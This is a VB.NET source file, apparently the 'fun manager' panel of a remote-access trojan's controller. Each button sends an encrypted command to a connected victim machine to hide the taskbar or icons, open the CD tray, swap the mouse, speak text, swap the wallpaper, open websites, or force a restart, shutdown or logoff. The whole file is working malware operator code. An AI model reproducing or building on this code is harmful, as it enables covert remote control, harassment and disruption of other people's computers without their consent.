Public Class FunManager
    Public connected As Connection
    Private Sub btn_hidetb_Click(sender As Object, e As EventArgs) Handles btn_hidetb.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("hideTaskbar", Form1.enckey))
        Catch 
        End Try
    End Sub
    Private Sub btn_showtb_Click(sender As Object, e As EventArgs) Handles btn_showtb.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("ShowTaskbar", Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub btn_hidedi_Click(sender As Object, e As EventArgs) Handles btn_hidedi.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("HideIcons", Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub btn_showdi_Click(sender As Object, e As EventArgs) Handles btn_showdi.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("ShowIcons", Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub btn_opencd_Click(sender As Object, e As EventArgs) Handles btn_opencd.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("OpenCD", Form1.enckey))
        Catch 
        End Try
    End Sub
    Private Sub btn_closecd_Click(sender As Object, e As EventArgs) Handles btn_closecd.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("CloseCD", Form1.enckey))
        Catch 
        End Try
    End Sub
    Private Sub btn_swap_Click(sender As Object, e As EventArgs) Handles btn_swap.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("SwapMouse", Form1.enckey))
        Catch 
        End Try
    End Sub
    Private Sub btn_undo_Click(sender As Object, e As EventArgs) Handles btn_undo.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("UndoMouse", Form1.enckey))
        Catch 
        End Try
    End Sub
    Private Sub btn_speak_Click(sender As Object, e As EventArgs) Handles btn_speak.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("Speak|" & InputBox("Please insert a text to speak!", "Text to speak"), Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub btn_changewp_Click(sender As Object, e As EventArgs) Handles btn_changewp.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("Change|" & InputBox("Please insert a direct link to a .jpg!", "Change Wallpaper"), Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub btn_restart_Click(sender As Object, e As EventArgs) Handles btn_restart.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("restart", Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub btn_shutdown_Click(sender As Object, e As EventArgs) Handles btn_shutdown.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("shutdown", Form1.enckey))
        Catch 
        End Try
    End Sub
    Private Sub btn_logoff_Click(sender As Object, e As EventArgs) Handles btn_logoff.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("logout", Form1.enckey))
        Catch 
        End Try
    End Sub
    Private Sub btn_openweb_Click(sender As Object, e As EventArgs) Handles btn_openweb.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("Website|" & InputBox("Please enter a Website to open!", "Open Website"), Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub btn_startdiscomouse_Click(sender As Object, e As EventArgs) Handles btn_startdiscomouse.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("StartDiscoMouse", Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub btn_stopdiscomouse_Click(sender As Object, e As EventArgs) Handles btn_stopdiscomouse.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("StopDiscoMouse", Form1.enckey))
        Catch
        End Try
    End Sub
End Class